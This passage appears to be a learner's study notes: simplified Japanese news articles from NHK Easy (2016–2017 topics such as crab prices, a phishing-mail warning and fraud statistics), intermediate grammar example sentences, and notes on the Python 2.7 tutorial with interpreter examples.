ｇ９６００円になりました。去年の同じときより１５００円ぐらい高かくなりました。\n\n\n白糠漁協によると、今年は１２月になってから取ってくる毛ガニが少なくなりました。ロシアからの輸入も少なくなったため、いつもの年より値段が高くなっています。白糠町の毛ガニは、日本のいろいろな市場に送っています。\n\n####\n[ニュース_04](http://www3.nhk.or.jp/news/easy/k10010810711000/k10010810711000.html)\n１１月８日、アメリカの次の大統領を選ぶ選挙で、共和党のトランプさんが民主党のクリントンさんに勝ちました。トランプさんはビルやホテルなどをたくさん持っていることで有名ですが、今までに政治の仕事をしたことはありません。\n\n\nトランプさんは「アメリカとメキシコの間に壁を作る」とか「法律を守らないでアメリカに来た移民は国に帰らせる」などと言っています。そして、太平洋の周りの国が自由に貿易できるようにする協定のＴＰＰにも入らないと言っています。\n\n\nトランプさんは２０１７年１月２０日にアメリカの大統領になります。アメリカや世界の人たちは、トランプさんが今までに言ったことを本当に行うかどうか注目しています。\n\n####\n[ニュース_05](http://www3.nhk.or.jp/news/easy/k10010815741000/k10010815741000.html)\n１月１日、働きながら育児や介護をしている人が仕事を休みやすくするため、法律が変わります。\n\n\n３月、野球の世界大会「ＷＢＣ」が日本と韓国とアメリカであります。\n\n\n４月１日、都市ガスを使う人は自由にガスの会社を選ぶことができるようになります。今までは住んでいる場所で会社が決まっていました。\n\n\n４月１日、ブロックのおもちゃ「レゴ」のテーマパーク「レゴランド」が名古屋にできます。\n\n\n５月、２０１９年に日本で開くラグビーのワールドカップでどのチームとどのチームが試合をするか決まります。\n\n\n８月ごろ、東京にある文化庁が京都のどの場所に移るか決まります。早い場合で２０１９年に移ります。\n\n\n９月、東京の次の２０２４年のオリンピックとパラリンピックをどこで開くか決まります。\n\n\n１１月ごろ、日本人で１２人目の宇宙飛行士の金井宣茂さんが国際宇宙ステーションに行きます。\n\n####\n[ニュース_06](http://www3.nhk.or.jp/news/easy/k10010850561000/k10010850561000.html)\n鳥取県や兵庫県などでは、２３日から雪がたくさん降りました。\n\n\n鳥取県の高速道路では２３日の午後から、雪が積もって車が動くことができなくなりました。多いときは６０台ぐらいの車が止まっていました。\n\n\n鳥取県智頭町では雪が１m以上積もって、道で２６０台以上の車が動くことができなくなりました。車に乗っていた８２人が智頭町の公民館などに避難しました。自衛隊が車に乗っている人に食べ物や毛布などを配りました。\n\n####\n[ニュース_07](http://www3.nhk.or.jp/news/easy/k10010829471000/k10010829471000.html)\n東京の築地市場で５日の朝、今年初めての競りがありました。競りには、日本中の港や外国からたくさんのまぐろが集まりました。今年最も高い値段になったのは、青森県の大間で取れた２１２ｋｇのまぐろでした。値段は７４２０万円で、今までで２番目に高くなりました。\n\n\n築地市場は古くなったため、新しく作った豊洲市場に去年の１１月に引っ越す予定でした。しかし、豊洲市場の下にある土から体に悪い物質が見つかったため、いつ引っ越すことができるかわからなくなりました。\n\n\n東京都の小池知事は、早い場合は今年の冬に豊洲市場に引っ越すことができると言っています。このため、築地市場での競りは今年で終わる可能性があります。\n\n####\n[ニュース_08](http://www3.nhk.or.jp/news/easy/k10010853761000/k10010853761000.html)\n東京で２６日、スマートフォンを使って体に障害がある人や外国人に声で道を案内する実験がありました。\n\n\n目に障害がある女性が、スマートフォンに向かって行きたい店の名前を話すと、「右に曲がって進んでください」などと声で案内します。車いすを使っている人には、階段やエスカレーターを使わない道などを伝えます。外国人のために英語で案内をすることもできます。\n\n\nこのサービスを作った会社によると、今案内できるのは東京都の中央区の一部の場所だけです。会社は、オリンピックとパラリンピックを行う２０２０年までに、東京のどこでも使うことができるようにしたいと言っています。\n\n####\n[ニュース_09](http://www3.nhk.or.jp/news/easy/k10010852281000/k10010852281000.html)\n１月２８日は中国の正月の「春節」で、中国から多くの人が日本に旅行に来ます。農協や米を売る会社などの団体は２５日から、中国から旅行に来る人にパックに入ったごはんをプレゼントしています。\n\n\n８つの観光案内所や電化製品を売る東京の店などで、３月までに１０万個プレゼントします。東京駅の前にある観光案内所では２５日、電子レンジで温めたごはんを中国人に食べてもらって、アンケートも行いました。\n\n\n日本では、最近米があまり売れなくなっています。このため、農協などの団体は日本の米を輸出したいと考えて、中国人に宣伝することにしました。団体の人は「日本のおいしい米を多くの人に知ってもらいたいです」と話していました。\n\n####\n[ニュース_10](http://www3.nhk.or.jp/news/easy/k10010851781000/k10010851781000.html)\n沖縄県北谷町にある遺跡で、漢字の「工」の字のような模様がある土器の一部が見つかりました。土器は土を焼いて作った食器などです。\n\n\n北谷町が調べると、２５００年ぐらい前の縄文時代の終わりに、東北地方などにあった土器に似ていることがわかりました。この土器は「亀ヶ岡式土器」と言っていて、沖縄県で見つかったのは初めてです。\n\n\nこの遺跡では、縄文時代の次の弥生時代の土器も見つかっています。北谷町は「この時代に文化の交流があったことがわかります」と言っています。\n\n####\n[ニュース_11](https://www3.nhk.or.jp/news/easy/k10010847101000/k10010847101000.html)\n\n水産庁は、２０１６年度の日本の海の「スルメイカ」などの量について発表しました。スルメイカはイカの中で最もたくさんとれて、日本でよく食べます。\n\n\n水産庁によると、太平洋の方にいるスルメイカの量は、３３万４０００ｔでした。前の年度より３０％以上少くなくなりました。日本海の方にいるスルメイカの量も少くなくなりました。このため、去年日本でとれたスルメイカの量は、いつもの年の半分以下になったと考えられています。\n\n\n水産庁は、スルメイカが卵を産むと言われている東シナ海の水の温度が低くなって、卵を産みにくくなっていることも原因の１つだと言っています。このほかにも少くなくなっている魚があって、大きな問題になっています。\n\n####\n[ニュース_12](https://www3.nhk.or.jp/news/easy/k10010845481000/k10010845481000.html)\n\nもうすぐ花粉が飛ぶ季節になります。花粉が飛び始めると、花粉症の人はひどいくしゃみが出たり、目がかゆくなったりして大変です。\n\n\n東京都によると、今年の春に飛ぶ杉やひのきの花粉は、東京都では１cm²に３８００個〜５２００個になりそうです。去年と同じぐらいです。花粉が飛び始めるのは２月１５日〜１８日ごろになりそうです。\n\n\n花粉は、暖かい日や風が強くて空気が乾いている晴れた日にたくさん飛びます。杉の花粉は３月、ひのきの花粉は４月に特に多くなって、５月中旬まで飛びそうです。\n\n\n東京都は、かぜなどで体が弱くなっていると花粉症がひどくなるため、健康に気をつけるように言っています。\n\n####\n[ニュース_13](https://www3.nhk.or.jp/news/easy/k10010843401000/k10010843401000.html)\n\n日本へ旅行に来た外国人が日本人と会話をするときに便利なカードを、東京にある印刷会社などが作りました。\n\n\nカードには日本語と英語と中国語で「泊まることができる場所はありますか」とか「トイレはどこですか」などと書いてあります。日本語を話すことができなくても、このカードを見せてコミュニケーションをすることができます。\n\n\nこのカードは無料で、今年の春から東京の浅草のレストランやホテルなどに置きます。インターネットを使うための無線のＷｉ－Ｆｉの場所などがわかる地図も一緒にもらうことができます。\n\n####\n[ニュース_14](https://www3.nhk.or.jp/news/easy/k10010843331000/k10010843331000.html)\n\n会社が社員などを長い時間働かせることが問題になっています。厚生労働省は、去年４月から残業が１か月に８０時間より多い人がいる場合、会社などに行って調べています。９月までの半年で約１万の会社などを調べました。\n\n\n調べた結果、４４％の約４４００の会社などで、会社と社員で決めた時間より長く残業させていたことがわかりました。残業代を払っていないところは６００以上ありました。健康診断をしていないところもあって、６０％以上の会社などが法律に違反していました。\n\n####\n[ニュース_15](https://www3.nhk.or.jp/news/easy/k10010836891000/k10010836891000.html)\n\n日本マイクロソフトによると、１２日から、うそのメールがたくさん見つかっています。うそのメールは、「マイクロソフト社のセキュリティチーム」が送ったように書いてあります。メールのタイトルは「ご注意！ＯＦＦＩＣＥのプロダクトキーが不正コピーされています」などです。\n\n\nメールには、ワードやエクセルなどのソフトウエアを使うときに必要なプロダクトキーがほかの人にコピーされたと書いてあります。そして、メールに出ているリンクをクリックするように書いてあります。クリックすると、うそのウェブサイトが開きます。\n\n\n日本マイクロソフトは、コンピューターにウイルスが入ったり、自分の情報が盗まれたりする危険があるため、うそのメールは開かないで消すように言っています。\n\n####\n[ニュース_16](https://www3.nhk.or.jp/news/easy/k10010834181000/k10010834181000.html)\n\n三菱総合研究所は、人のように自分で考えるコンピューターのＡＩやロボットなどを使うことが増えると、人の仕事がどのように変わるか調べました。\n\n\n研究所によると、２０３０年にはＡＩを使って専門の仕事をする人などが増えて、全部で５００万人がする仕事が増えます。しかし、物を作る工場などではＡＩやロボットが人の代わりに仕事をするため、７４０万人がする仕事がなくなります。このため、計算すると２４０万人がする仕事がなくなります。\n\n\n研究所は、新しい技術を使うことができなくて仕事がなくなる人が増えないように考えることが必要だと言っています。\n\n####\n[ニュース_17](https://www3.nhk.or.jp/news/easy/k10010849581000/k10010849581000.html)\n\nスマートフォンでお金を払うことができる「アリペイ」というサービスは、中国で４億人以上が利用しています。コンビニのローソンは、１月２４日から日本にある全部の店でこのサービスを利用できるようにしました。\n\n\n１月２８日から中国の正月の「春節」が始まります。ローソンは、春節に日本へ旅行に来るたくさんの中国人に買い物をしてほしいと考えています。\n\n\n日本では、ほかにも「アリペイ」を利用できる店があります。福岡市では、市と商店街がこのサービスを始めるための実験を行っています。\n\n####\n[ニュース_18](https://www3.nhk.or.jp/news/easy/k10010844481000/k10010844481000.html)\n\n中国の福建省にある「パンダ研究センター」にいるパンダが、「世界で最も長く生きているパンダ」というギネスの記録になりました。このパンダはことし３７歳になる雌の「バス」で、人間の年にすると１００歳以上です。\n\n\nパンダ研究センターでは１８日、ギネスの記録になったお祝いをしました。「バス」は頭に飾りをのせて、おかゆをおいしそうに食べていました。\n\n\n「バス」は若いときに自転車に乗るなどいろいろな芸をして有名になりました。今は目などに少し病気がありますが、元気に生活しています。\n\n####\n[ニュース_19](https://www3.nhk.or.jp/news/easy/k10010861721000/k10010861721000.html)\n\n警察によると、電話やメールなどでだましてお金をとる詐欺は、２０１６年に１万４１５１件ありました。詐欺でとられたお金は全部で４０６億円以上でした。前の年より少なくなりましたが、４００億円以上の年が４年続いています。\n\n\nいちばん多かったのは、息子や孫だとうそを言ってお金をとる詐欺でした。次に多かったのは、利用していないウェブサイトなどの料金を払えとメールや手紙を送ってくる詐欺でした。\n\n\n「私は役所の職員です。税金が戻ってきますよ」などと言って、ＡＴＭでお金を送らせる詐欺は、前の年より増えました。\n\n\nだまされた人の７８％が６５歳以上でした。警察は、銀行などともっと協力してお年寄がだまされないようにしたいと言っています。\n\n####\n[ニュース_20](https://www3.nhk.or.jp/news/easy/k10010866331000/k10010866331000.html)\n\n北海道札幌市で６８回目の「さっぽろ雪まつり」が６日から始まりました。毎年日本や外国から２００万人以上の人が、雪や氷で作った像を見に来ます。\n\n\n今年は３つの会場に全部で２００の像が並んでいます。大通公園の会場には、雪で作った高１７ｍ以上の建物の像があります。有名なフランスの凱旋門です。去年「ＰＰＡＰ」の歌で有名になったピコ太郎さんの像も雪で作りました。\n\n\n大阪から来た女性は「初めて見ましたが、顔の細かい所まで作ってあってびっくりしました」と話していました。\n\n\n「さっぽろ雪まつり」は１２日までです。\n\n####\n[ニュース_21](http://www3.nhk.or.jp/news/easy/k10010874411000/k10010874411000.html)\n北朝鮮は１２日、ミサイルを発射しました。ミサイルは東に５００ｋｍ飛んで日本海に落ちたと韓国は言っています。\n\n\n北朝鮮は「きのう新しいミサイルを発射する実験に成功した」と１３日に発表しました。\n\n\nミサイルの発射は、安倍総理大臣とアメリカのトランプ大統領が会って、北朝鮮は核兵器やミサイルを作るのをやめるように言ったあとでした。安倍総理大臣とトランプ大統領はすぐに北朝鮮を非難するメッセージを発表しました。安倍総理大臣は「決して許すことはできない」と言いました。\n\n####\n[ニュース_22](http://www3.nhk.or.jp/news/easy/k10010868931000/k10010868931000.html)\n牛丼の「吉野家」によると、「牛丼１５，０００円分が食べ放題」などと書いたうその広告が、先月からインターネットに出ています。広告には吉野家と似ているマークや牛丼の写真も出ていました。\n\n\nうその広告には、別のアドレスにメールを送るように書いてあります。このアドレスにメールを送ると、吉野家とは関係のない広告のメールが届くようになります。\n\n\n吉野家は「私たちが出した広告ではありません」と話しています。そして、うその広告に書いてあるアドレスにメールを送らないように言っています。\n\n####\n[ニュース_23](http://www3.nhk.or.jp/news/easy/k10010875021000/k10010875021000.html)\n外国人があまり知らない日本の観光地を紹介するホテルが、東京都中央区にできました。日本の観光地をインターネットのビデオで紹介している会社が作りました。\n\n\nホテルの１階にはコンピューターと大きなテレビがあって、いろいろな観光地のビデオを見たり、行き方を調べたりできます。ホテルによると、外国人にもっと来てほしいと考えている市や町がたくさんあります。\n\n\n働いている人はほとんどが外国人で、日本のいろいろな観光地をよく知っている人たちです。ホテルは「日本に来た外国人に、今まで知らなかった場所にも行ってほしいと思います」と話しています。\n\n####\n[ニュース_24](http://www3.nhk.or.jp/news/easy/k10010882351000/k10010882351000.html)\n東京都立川市の７つの小学校に通う子どもや先生などが、１７日の夕方からおなかが痛くなったり吐いたりしました。\n\n\n立川市によると、具合が悪くなったのは、８７４人の子どもと６９人の先生などです。入院した子どももいますが、重症ではありません。\n\n\n７つの小学校は、同じ給食センターで作った給食を食べています。保健所は、給食が原因かもしれないと考えて調べています。\n\n####\n[ニュース_25](http://www3.nhk.or.jp/news/easy/k10010885381000/k10010885381000.html)\n鳥取県にある青谷横木遺跡という遺跡では、１０００年以上前にあった「山陰道」という道の跡が見つかっています。\n\n\n鳥取県埋蔵文化財センターがこの遺跡を調べると、１８個の柳の木の根が見つかりました。木の根は５０ｃｍ～２ｍの間をあけてまっすぐ並んでいました。\n\n\n鳥取県埋蔵文化財センターは、１０世紀の終わりごろの平安時代に「山陰道」に植えた木の根だろうと言っています。こんなに古い時代に道に木を並べて植えた跡が見つかったのは日本では初めてだと言っています。\n\n####\n[ニュース_26](http://www3.nhk.or.jp/news/easy/k10010885231000/k10010885231000.html)\n国は、日本の陸や周りの海にある活断層などのうち９７を「主要活断層帯」に決めて、地震が起こる可能性などを調べています。「主要活断層帯」は断層の長さや活動の多さなどで決めています。\n\n\n２１日の会議で、地下にも断層が続いていたり、活動が多くなっていたりしていると考えられるほかの活断層などについて、話し合いました。\n\n\nそして、中国地方の８つ、九州地方の６つ、関東地方などの２つの全部で１６の活断層などを新しく「主要活断層帯」にすることを決めました。日本の「主要活断層帯」は全部で１１３になりました。\n\n####\n[ニュース_27](http://www3.nhk.or.jp/news/easy/k10010883581000/k10010883581000.html)\n携帯電話の会社のＫＤＤＩは、ビルの中のトイレが空いているかどうかスマートフォンなどでわかるサービスを３月から始めます。\n\n\nトイレのドアにはセンサーを付けます。センサーはインターネットとつながっていて、人が入っていないトイレをスマートフォンやパソコンで知ることができます。トイレに入っている時間が長くなると、メールでビルの会社に知らせます。\n\n\nＫＤＤＩは、いろいろな会社のビルやデパートなどでこのサービスを利用してほしいと考えています。\n\n####\n[ニュース_28](http://www3.nhk.or.jp/news/easy/k10010883221000/k10010883221000.html)\n昔、忍者が住んでいた滋賀県甲賀市と三重県伊賀市は、２月２２日を「忍者の日」にして、イベントを行っています。甲賀市の役所では２０日から２４日まで、職員が忍者の服を着て仕事をしています。\n\n\n約２０人の職員たちは黒や赤の忍者の服を着て、電話をしたり、パソコンを使ったりしていました。職員は「忍者なので、いつもよりも早く仕事ができそうです」と話していました。\n\n\n甲賀市では２２日に忍者について勉強する会などを行います。甲賀市の職員は「ぜひ遊びに来てほしいです」と話していました。\n\n####\n[ニュース_29](http://www3.nhk.or.jp/news/easy/k10010889941000/k10010889941000.html)\n中国の北京で２５日と２６日、日本の九州、北陸、東北の食べ物や工芸品などを紹介するイベントがありました。このイベントは、日本の政府が、外国人に人気がある東京や京都だけではなくて、いろいろな町のよさを知ってほしいと考えて行いました。\n\n\n会場には、職人が陶器を作って見せている所や、日本酒を飲むことができる所があって、たくさんの人が集まっていました。\n\n\n日本酒を飲んでみた若い男性は「飲みやすくておいしいです」と話していました。若い女性は「九州で寺に行ったり、食べ物を楽しんだりしたいです」と話していました。\n\n####\n[ニュース_30](http://www3.nhk.or.jp/news/easy/k10010890231000/k10010890231000.html)\n働く人が足りないため、店員がいなくても、レジで客が自分で計算してお金を払うシステムを使う店が増えています。\n\n\nＤＶＤなどを貸す店の「ゲオ」では、２年前からこのシステムを使っています。客は、ＤＶＤや本などに付いているバーコードを機械に読ませて、お金を払います。このシステムを使っている店は、客がレジで待つ時間が短くなって、売り上げが増えていると言っています。３月には、７４５の店でこのシステムを使う予定です。\n\n\nレストランの「ガスト」などでは１月に、東京にある３つの店でこのシステムを使ってみました。その結果、客が多い時間でも、レジにあまり人が並ばなくなりました。店員は、レジ以外の仕事にもっと時間を使うことができるようになりました。\n\n####\n[ニュース_31](http://www3.nhk.or.jp/news/easy/k10010912421000/k10010912421000.html)\n２０２０年にオリンピックとパラリンピックがあるため、東京の近くには新しいホテルがたくさんできています。千葉県浦安市に、ロボットが人の代わりに働くホテルができました。\n\n\nホテルのフロントでは、恐竜の形をしたロボットが日本語や英語、中国語、韓国語で客と話します。客が泊まる部屋にもロボットが置いてあります。このロボットに話すと、テレビやエアコンをつけたり消したりすることができます。\n\n\nこのホテルを経営している会社は、長崎県にあるテーマパークのハウステンボスでも、ロボットを使ったホテルを経営しています。ホテルの社長は「日本に来た外国人に、ロボットがいるホテルを楽しんでほしいです」と話していました。\n\n####\n[ニュース_32](http://www3.nhk.or.jp/news/easy/k10010911661000/k10010911661000.html)\nタイのバンコクの空港に１０日、アフリカのエチオピアから来た飛行機の荷物を、タイ人の２人の女が取りに来ました。２人は別の飛行機で来たため、空港の職員がおかしいと思って荷物の中をチェックすると、サイの角が２１本見つかりました。\n\n\n世界ではサイの数が少なくなって、将来いなくなる可能性が高いため、輸出や輸入は禁止されています。しかし、ベトナムや中国ではサイの角が薬になるため、高い値段で売ったり買ったりしています。タイの空港で見つかったサイの角を売ると５億円ぐらいになります。\n\n\n警察は、荷物を取りに来て逃げた２人の女をさがしています。\n\n####\n[ニュース_33](http://www3.nhk.or.jp/news/easy/k10010911101000/k10010911101000.html)\n国立情報学研究所のグループは、外国人が日本へ旅行に来て、どこからどこへ行ったかすぐにわかるシステムを作りました。\n\n\n旅行に来た外国人が無料で利用できる無線のＬＡＮのデータを使うと、外国人がいた場所が地図に出ます。そして、外国人がどこからどこへ行ったかわかります。\n\n\nこのシステムを使って、先月東京であったマラソンの大会のコースの近くにいた外国人２３５人について調べました。その結果、ゴールがあった東京駅の近くなどから、夜は新宿や上野へ行ったことがわかりました。\n\n####\n[ニュース_34](http://www3.nhk.or.jp/news/easy/k10010909711000/k10010909711000.html)\n政府は新しい法律を作って、残業の規則を厳しくしようと考えています。\n\n\n会社を経営している人たちの団体の経団連と、働く人たちの団体の連合は、残業の規則を何時間までにするか話し合あっていました。２つの団体は、忙しいときでも１年の残業を７２０時間までにする案などに賛成していました。しかし、忙しいときの１か月の残業を何時間までにするかについては違う意見でした。\n\n\n安倍総理大臣は１３日、経団連の榊原会長と、連合の神津会長と会いました。そして、忙しいときでも１か月の残業は１００時間より少なくしたいと言いました。経団連と連合は、安倍総理大臣の言うとおりにしようと考えています。\n\n####\n[ニュース_35](http://www3.nhk.or.jp/news/easy/k10010902081000/k10010902081000.html)\nタイのバンコクの空港にアフリカのエチオピアから着いた荷物から、３日と４日、全部で３３０ｋｇの象牙が見つかりました。アフリカゾウという象５０頭以上の象牙が、１５個の荷物の中に入っていて、たくさんの石の中に隠してありました。\n\n\nタイの警察は、荷物を取りに来た男を逮捕して、この男と関係があるグループについて調べることにしています。\n\n\n象牙の輸出や輸入は禁止されています。しかし、中国のお金持ちの中には、部屋などに飾るため象牙で作った物を買う人が多いと言われています。タイの警察は、見つかった象牙は、隠れて中国などに輸出しようとした物だと考えています。\n\n####\n[ニュース_36](http://www3.nhk.or.jp/news/easy/k10010918801000/k10010918801000.html)\n気象庁は、東京の靖国神社にあるソメイヨシノという桜の木を調べて、花が咲くと発表しています。\n\n\n２１日、桜の花が５つ咲いていることがわかって、「東京で桜の花が咲きました」と発表しました。今年は日本でいちばん早く東京で桜の花が咲きました。\n\n\n気象庁によると、東京の桜は１週間から１０日ぐらいで満開になりそうです。\n\n####\n[ニュース_37](http://www3.nhk.or.jp/news/easy/k10010914911000/k10010914911000.html)\n日本の政府は１７日、鹿児島県の種子島宇宙センターから人工衛星を打ち上げました。\n\n\nこの人工衛星は、地球の周りを飛びながら、陸や海のいろいろな場所を撮影して情報を集めます。夜や天気が悪いときでも電波を使って撮影することができます。\n\n\n人工衛星の情報は、北朝鮮がミサイルを発射する場所や、日本の周りの海、災害の様子などを調べるために使います。\n\n\n情報を集める日本の人工衛星は７つ目です。地球の全部を１日に１回以上、撮影できるようになりました。\n\n####\n[ニュース_38](http://www3.nhk.or.jp/news/easy/k10010919331000/k10010919331000.html)\n厚生労働省は毎年、お年寄を殴ったりいじめたりする「虐待」がどのくらいあったか調べています。\n\n\n２０１５年度は、お年寄を介護する施設の職員からの虐待が４０８件ありました。前の年度より１０８件増えて、今までで最も多くなりました。職員の知識や技術が足りないことや、ストレスが多いことなどが原因です。\n\n\n一緒に住んでいる家族などからの虐待は１万５９７６件ありました。体を殴ったりすることが最も多くて、ひどいことを言って心に傷をつけたり、必要な世話をしなかったりすることもありました。息子からの虐待が最も多くて、次は夫と娘からでした。\n\n####\n[ニュース_39](http://www3.nhk.or.jp/news/easy/k10010929061000/k10010929061000.html)\n熊本県立図書館は、去年４月の大きな地震で建物が壊れました。１階は去年６月に利用できるようになりましたが、２階と３階は天井などを直していて利用できませんでした。\n\n\n２９日、１階から３階まで全部利用できるようになった図書館が開きました。１階には子どものための本、２階には普通の本、３階には熊本県などについて書いた本が地震の前と同じように並んでいます。\n\n\n来た女性は「ここで本を読むのを楽しみにしていました」と話していました。図書館の人は「長い間お待たせしました。前と同じように利用してほしいと思います」と話しています。\n\n####\n[ニュース_40](http://www3.nhk.or.jp/news/easy/k10010921801000/k10010921801000.html)\n名古屋市には有名な城の名古屋城があります。城でいちばん立派な建物の天守閣は１６１２年にできました。天守閣は戦争で焼けてしまったため、１９５９年に鉄筋コンクリートでもう１度建てました。しかし、最近、この建物が古くなってきました。\n\n\n名古屋市は、天守閣をもう１度建てることについて議会で相談していました。そして、昔のように木で建てることを決めました。工事には５００億円以上かかります。\n\n\n名古屋市は、２０１９年の秋ごろに今の天守閣を壊わして、２０２２年に新しい天守閣ができるようにしたいと考えています。\n\n###みんなの日本語中級１文型\n####第一課\n* ソースの見方を教えて頂けませんか。\n* 猫のように可愛い彼女を探したいです。\n* 私の趣味は漢方薬の本を読むことです。\n* 正月に神社やお寺に行くことを初詣でと言う\n* Fabricというツールを知っている\n* どんなに高くても一戸建てを買いたいです。\n####第二課\n* 鞄を開けたら、パスポートがなくなっていた。\n* Tudouというのは中国で有名なサイトのことです。\n* 母に財布を忘れないように注意します\n* ジュースみたいなお酒しか飲みません\n####第三課\n* 月曜日は休ませていただきますか？\n* 来年帰国するにします。\n* 生物を食べないことにしています\n* このチケットを担当することになりました。\n* 明日の18時から忘年会を行うことになっています。\n* 早く春が来てほしい。\n* あのアニメはあまり面白くなさそうです。\n####第四課\n* 山田さんから電話があったのですが、約束の時間に少し遅れるということです。\n* グループ長は山田さんにアメリカへ出張させました。\n* 昨日母に部屋を掃除させられました。\n* 新卒の山田さんをご紹介します\n* 妹は友達の本を欲しがっている\n####第五課\n* 改札口を出て、階段を上ったところで、待っていてください。\n* 家を出ようとしたとき、電話がかかってきた\n* 鈴木さんはいい社長になるだろうと思います。\n####第六課\n* 値段が高いので、iPhoneを買うつもりはありません\n* タイへ旅行に行くつもりでしたが、両親に会いたいので、帰国することにします。\n* 一生懸命にやっているつもりです。\n* 星が見えてきた。\n* この猫は一日中、寝てばかりいる。\n####第七課\n* 週報は日本語でなくてはなりません\n* 中山さんが書いたコードは素晴らしく、感心させられました。\n* 毎日自分でご飯を作って、母をびっくりさせました。\n* 頭が痛いなら、この薬を飲むといいですよ\n####第八課\n* 電車に乗っている間、3DSをしていた。\n* このチケットは金曜日までにできたほうがいいと思います。\n* 好きな食べ物は人によって違います\n* 眼鏡をかけたまま、お風呂に入りました。\n####第九課\n* ここに座ってもかまいませんか\n* 神戸は尼崎より有名ですが、大阪ほど有名ではない。\n* 彼女ほど可愛い人はいません。\n* お金があれば、この一戸建てが買えたのに...\n####第十課\n* そのゲームなら、面白いはずです。\n* 人気がある映画なのだから、面白くないはずはありません。\n* 忘年会に行くはずだった。しかし、病気で行けなくなった。\n* 母の料理がいつも美味しいですが、時々美味しくないこともあります。\n####第十一課\n* これから、日本で働く外国人が増えていくでしょう\n* 新聞によると、東京で大きい雪が降ったらしい。\n* 東京は、日本の首都として世界中に知られている。\n####第十二課\n* 週末は本を読んだり、テレビを見たりしています。\n* 私は昨日雨にふられて、濡れてしまった。\n* 値段が安かったおかげで、たくさん林檎を買えました。\n* 事故のせいで、授業に遅れてしまいました。\n##Python\n###資料\n[Python Tutorial (英語)](https://docs.python.org/2.7/tutorial/index.html)Python\nTutorial (中国語) [http://www.pythondoc.com/pythontutorial27/index.html]\n\nPython Tutorial (日本語) [http://docs.python.jp/3/tutorial/index.html]\n\n学んだこと\n基礎知識\nPython インタプリタ\n * Python インタプリタは、それが使えるマシン上では通常 /usr/local/bin/python \n   としてインストールされています。その他の場所としては /usr/local/python  が一般的です。\n\nPython の紹介\n * 割り算 (/), //  演算子,**  演算子\n\n>>> 17 / 3  # int / int -> int\n5\n>>> 17 / 3.0  # int / float -> float\n5.666666666666667\n>>> 17 // 3.0  # explicit floor division discards the fractional part\n5.0\n>>> 17 % 3  # the % operator returns the remainder of the division\n2\n>>> 5 ** 2  # 5 squared\n25\n>>> 2 ** 7  # 2 to the power of 7\n128\n\n\n * 対話モードでは、最後に表示された結果は変数 _  に代入されます。このことを利用すると、Python\n   を電卓として使うときに、計算を連続して行う作業が多少楽になります\n\n>>> tax = 12.5 / 100\n>>> price = 100.50\n>>> price * tax\n12.5625\n>>> price + _\n113.0625\n>>> round(_, 2)\n113.06\n\n\n * 文字列は +  演算子で連結させる (くっつけて一つにする) ことができ、*  演算子で反復させることができます\n\n>>> # 3 times 'un', followed by 'ium'\n>>> 3 * 'un' + 'ium'\n'unununium'\n\n\n * 末尾にコンマを入れると、出力を行った後に改行されません。\n\nその他の制御フローツール\n * ループ文は else  節を持つことができます。これは、 (for  で) 反復処理対象のリストを使い切ってループが終了したとき、または (while \n   で) 条件が偽になったときに実行されますが、 break  文でループが終了したときは実行されません\n\n>>> for n in range(2, 10):\n...     for x in range(2, n):\n...         if n % x == 0:\n...             print n, 'equals', x, '*', n/x\n...             break\n...     else:\n...         # loop fell through without finding a factor\n...         print n, 'is a prime number'\n...\n2 is a prime number\n3 is a prime number\n4 equals 2 * 2\n5 is a prime number\n6 equals 2 * 3\n7 is a prime number\n8 equals 2 * 4\n9 equals 3 * 3\n\n\n * デフォルト値は、関数が定義された時点で、関数を 定義している 側のスコープ (scope) で評価されるので, 5  を出力します。\n\ni = 5\n\ndef f(arg=i):\n    print arg\n\ni = 6\nf()\n\n\nデータ構造\n * 引数リストのアンパック\n\n>>> list(range(3, 6))            # normal call with separate arguments\n[3, 4, 5]\n>>> args = [3, 6]\n>>> list(range(*args))            # call with arguments unpacked from a list\n[3, 4, 5]\n\n>>> def parrot(voltage, state='a stiff', action='voom'):\n...     print \"-- This parrot wouldn't\", action,\n...     print \"if you put\", voltage, \"volts through it.\",\n...     print \"E's\", state, \"!\"\n...\n>>> d = {\"voltage\": \"four million\", \"state\": \"bleedin' demised\", \"action\": \"VOOM\"}\n>>> parrot(**d)\n-- This parrot wouldn't VOOM if you put four million volts through it. E's bleedin' demised !\n\n\n * filter(function, sequence)  は、シーケンス sequence中の要素 item  から、 function(item) \n   が真となるような要素からなるシーケンスを返します。もし sequence  が str  か unicode  か tuple \n   なら、返り値も同じ型になります。そうでなければ list  になります。\n\n>>> seq = [3,2,5,6,8,9,10]\n>>> filter(lambda x : x < 6, seq)\n[3, 2, 5]\n\n\n * map(function, sequence)  は、シーケンス sequence  の各要素 item  に対して function(item) \n   を呼び出し、その戻り値からなるリストを返します。複数のシーケンスを渡すこともできます。その場合、第一引数の関数はシーケンスの数と等しい数の引数を受け取る必要があり、各シーケンスの値が渡されます。\n   (幾つかのシーケンスが他のシーケンスよりも短かった場合は、その場所には None  が渡されます。)\n\n>>> seqA = [3,5,6,9]\n>>> seqB = [4,6,8]\n>>> map(lambda x,y:x+y, seqA, seqA)\n[6, 10, 12, 18]\n>>> map(None, seqA, seqA)\n[(3, 3), (5, 5), (6, 6), (9, 9)]\n>>> map(None, seqA, seqB)\n[(3, 4), (5, 6), (6, 8), (9, None)]\n>>> map(lambda x,y:x+y, seqA, seqB)\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"\", line 1, in \nTypeError: unsupported operand type(s) for +: 'int' and 'NoneType'\n\n\n * reduce(function, sequence)  は単一の値を返します。この値は 2 つの引数をとる関数 function  をシーケンス \n   sequence \n   の最初の二つの要素を引数として呼び出し、次にその結果とシーケンスの次の要素を引数にとり、以降これを繰り返していきます。シーケンス中にただ一つしか要素がなければ、その値自体が返されます。シーケンスが空なら、例外が送出されます。3\n   つめの引数をわたして、初期値を指定することもできます。この場合、空のシーケンスを渡すと初期値が返されます。それ以外の場合には、まず初期値とシーケンス中の最初の要素に対して関数が適用され、次いでその結果とシーケンスの次の要素に対して適用され、以降これが繰り返されます。\n\n>>> reduce(lambda x,y:x+y, range(10))\n45\n>>> reduce(lambda x,y:x+y, range(10),10)\n55\n>>> reduce(lambda x,y:x+y, [],10)\n10\n>>> reduce(lambda x,y:x+y, [])\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: reduce() of empty sequence with no initial value\n>>> reduce(lambda x,y:x+y, [3])\n3\n\n\n * リストから要素を削除する際、値を指定する代わりにインデックスを指定する方法があります。それが del  文です。これは pop() \n   メソッドと違い、値を返しません。 del \n   